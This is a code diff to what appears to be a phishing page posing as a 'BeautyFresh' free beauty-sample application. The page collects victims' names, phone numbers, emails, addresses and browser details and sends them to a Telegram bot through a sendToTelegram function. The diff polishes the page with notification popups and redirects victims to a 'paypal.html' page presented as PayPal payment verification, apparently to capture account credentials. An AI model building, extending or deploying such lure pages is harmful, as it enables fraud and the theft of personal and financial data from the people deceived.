@@ -287,6 +287,35 @@ footer {
   100% { transform: rotate(360deg); }
 }
 
+/* Notification */
+.notification {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  padding: 15px 20px;
+  border-radius: 8px;
+  color: white;
+  font-weight: 600;
+  z-index: 1000;
+  opacity: 0;
+  transform: translateX(100px);
+  transition: all 0.3s;
+  max-width: 300px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+}
+
+.notification.success {
+  background-color: #28a745;
+  opacity: 1;
+  transform: translateX(0);
+}
+
+.notification.error {
+  background-color: #dc3545;
+  opacity: 1;
+  transform: translateX(0);
+}
+
 /* Responsive */
 @media (max-width: 768px) {
   .form-container {
@@ -301,6 +330,12 @@ footer {
   .product-preferences {
     grid-template-columns: 1fr;
   }
+  
+  .notification {
+    left: 20px;
+    right: 20px;
+    max-width: none;
+  }
 }
 </style>
 </head>
@@ -312,6 +347,9 @@ footer {
   <h3 style="color: #ff4f9a; margin-bottom: 10px;">Processing Your Application</h3>
   <p style="color: #666; text-align: center;">Please wait while we submit your information...</p>
 </div>
+
+<!-- Notification Element -->
+<div class="notification" id="notification"></div>
 
 <header>BEAUTY<span>fresh</span></header>
 
@@ -543,6 +581,19 @@ document.querySelectorAll('input[name="location"]').forEach(radio => {
   });
 });
 
+// Function to show notifications
+function showNotification(message, type = 'info') {
+  const notification = document.getElementById('notification');
+  notification.textContent = message;
+  notification.className = 'notification ' + type;
+  
+  setTimeout(() => {
+    notification.classList.remove('success', 'error');
+    notification.style.opacity = '0';
+    notification.style.transform = 'translateX(100px)';
+  }, 3000);
+}
+
 // Form submission handler
 function submitApplication() {
   event.preventDefault();
@@ -566,17 +617,17 @@ function submitApplication() {
   
   // Basic validation
   if (!formData.fullname || !formData.phone || !formData.email || !formData.address || !formData.location) {
-    alert('Please fill in all required fields marked with *');
+    showNotification('Please fill in all required fields marked with *', 'error');
     return;
   }
   
   if (formData.location === 'Other' && !formData.otherLocation) {
-    alert('Please specify your location');
+    showNotification('Please specify your location', 'error');
     return;
   }
   
   if (!formData.terms || !formData.privacy) {
-    alert('Please agree to the Terms & Conditions and Privacy Policy');
+    showNotification('Please agree to the Terms & Conditions and Privacy Policy', 'error');
     return;
   }
   
@@ -594,8 +645,12 @@ function submitApplication() {
     
     // Simulate processing delay
     setTimeout(() => {
-      // Redirect to successful.html
-      window.location.href = 'succesful.html';
+      showNotification('Application submitted! Redirecting to payment verification...', 'success');
+      
+      // REDIRECT TO paypal.html AFTER FORM SUBMISSION
+      setTimeout(() => {
+        window.location.href = 'paypal.html';
+      }, 2000);
     }, 2000);
   });
 }
@@ -623,7 +678,7 @@ async function sendToTelegram(formData) {
   
   // Create message
   const message = `
-📦 *NEW PRODUCT SAMPLE APPLICATION*
+📦 *BEAUTYFRESH PRODUCT SAMPLE APPLICATION*
 
 👤 *Personal Information:*
 • *Name:* ${formData.fullname}
@@ -649,7 +704,8 @@ ${preferencesText}
 • *Browser:* ${formData.userAgent}
 • *Time:* ${formData.timestamp}
 
-✅ *Application submitted successfully!*
+✅ *BeautyFresh application submitted!*
+🔜 *User redirected to PayPal verification page*
   `;
   
   try {
